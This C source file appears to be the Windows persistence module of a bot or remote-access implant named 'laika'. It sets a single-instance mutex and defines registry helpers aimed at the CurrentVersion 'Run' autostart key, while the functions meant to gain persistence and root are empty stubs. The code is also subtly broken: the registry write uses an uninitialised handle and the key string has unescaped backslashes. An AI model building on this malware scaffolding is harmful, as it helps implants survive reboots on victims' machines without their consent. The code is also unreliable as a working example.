/* platform specific code for achieving persistence on windows */

#include <windows.h>

#include "persist.h"
#include "lconfig.h"
#include "lmem.h"
#include "lerror.h"

/*      we want a semi-random mutex that is stable between similar builds,
*   so we use the GIT_VERSION as our mutex :D */
#define LAIKA_MUTEX LAIKA_VERSION_COMMIT ".0"

#define LAIKA_REG_KEY "\Software\Microsoft\Windows\CurrentVersion"
#define LAIKA_REG_VAL "Run"

HANDLE laikaB_mutex;

/* check if laika is running as super-user */
bool laikaB_checkRoot() {
    return true; /* stubbed for now */
}

/* mark that laika is currently running */
void laikaB_markRunning() {
    laikaB_mutex = OpenMutex(MUTEX_ALL_ACCESS, false, TEXT(LAIKA_MUTEX));

    if (!laikaB_mutex) {
        /* mutex doesn't exist, we're the only laika process :D */
        laikaB_mutex = CreateMutex(NULL, 0, TEXT(LAIKA_MUTEX));
    } else {
        LAIKA_ERROR("Mutex already exists!\n");
    }
}

/* unmark that laika is currently running */
void laikaB_unmarkRunning() {
    ReleaseMutex(laikaB_mutex);
}

HKEY openReg(HKEY key, LPCTSTR subKey) {
    HKEY hKey;
    LONG code;

    if ((code = RegOpenKeyEx(key, subKey, 0, KEY_ALL_ACCESS, &hKey)) != ERROR_SUCCESS)
        LAIKA_ERROR("Failed to open registry key!\n");

    return hKey;
}

/* returns raw multi-string value from registry : see REG_MULTI_SZ at https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types */
LPCTSTR readReg(HKEY key, LPCTSTR val, LPDWORD sz) {
    LPCTSTR str;
    DWORD ret;

    /* get the size */
    *sz = 0;
    RegQueryValueEx(key, val, NULL, NULL, NULL, sz);
    str = (LPCTSTR)laikaM_malloc(*sz);

    if ((ret = RegQueryValueEx(key, val, NULL, NULL, str, sz)) != ERROR_SUCCESS)
        LAIKA_ERROR("Failed to read registry!\n");

    return str;
}

void writeReg(HKEY key, LPCTSTR val, LPCTSTR data, DWORD sz) {
    HKEY hKey;
    LONG code;

    if ((code = RegSetValueEx(hKey, val, 0, REG_MULTI_SZ, (LPBYTE)data, sz)) != ERROR_SUCCESS)
        LAIKA_ERROR("Failed to write registry!\n");
}

/* try to gain persistance on machine */
void laikaB_tryPersist() {
    /* stubbed */
}

/* try to gain root */
void laikaB_tryRoot() {
    /* stubbed */
}